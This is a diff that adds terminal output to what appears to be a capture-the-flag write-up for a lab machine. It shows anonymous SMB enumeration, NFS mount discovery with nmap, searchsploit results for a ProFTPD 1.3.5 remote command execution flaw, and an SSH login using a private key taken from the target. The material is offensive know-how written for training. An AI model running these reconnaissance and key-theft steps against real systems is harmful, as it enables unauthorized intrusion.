@@ -111,3 +111,99 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 20.08 seconds
 ```
+
+```
+smbclient //10.10.162.24/anonymous
+Enter WORKGROUP\reggie's password:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Sep  4 05:49:09 2019
+  ..                                  D        0  Wed Sep  4 05:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 05:49:09 2019
+  ```
+
+```
+smbclient //10.10.162.24/anonymous
+Enter WORKGROUP\reggie's password:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Sep  4 05:49:09 2019
+  ..                                  D        0  Wed Sep  4 05:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 05:49:09 2019
+  ```
+```
+  cat log.txt   
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):
+Created directory '/home/kenobi/.ssh'.
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /home/kenobi/.ssh/id_rsa.
+Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
+The key's randomart image is:
++---[RSA 2048]----+
+|                 |
+|           ..    |
+|        . o. .   |
+|       ..=o +.   |
+|      . So.o++o. |
+|  o ...+oo.Bo*o  |
+| o o ..o.o+.@oo  |
+|  . . . E .O+= . |
+|     . .   oBo.  |
++----[SHA256]-----+
+
+# This is a basic ProFTPD configuration file (rename it to
+# 'proftpd.conf' for actual use.  It establishes a single server
+# and a single anonymous login.  It assumes that you have a user/group
+# "nobody" and "ftp" for normal operation and anon.
+```
+
+```
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.162.24
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 12:59 CDT
+Nmap scan report for 10.10.162.24
+Host is up (0.12s latency).
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-showmount:
+|_  /var *
+
+Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds
+```
+
+```
+searchsploit ProFTPD 1.3.5            
+------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                             |  Path
+------------------------------------------------------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                  | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                        | linux/remote/36803.py
+ProFTPd 1.3.5 - File Copy                                                                  | linux/remote/36742.txt
+------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+```
+ssh -i id_rsa kenobi@10.10.162.24     
+The authenticity of host '10.10.162.24 (10.10.162.24)' can't be established.
+ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.162.24' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+```  
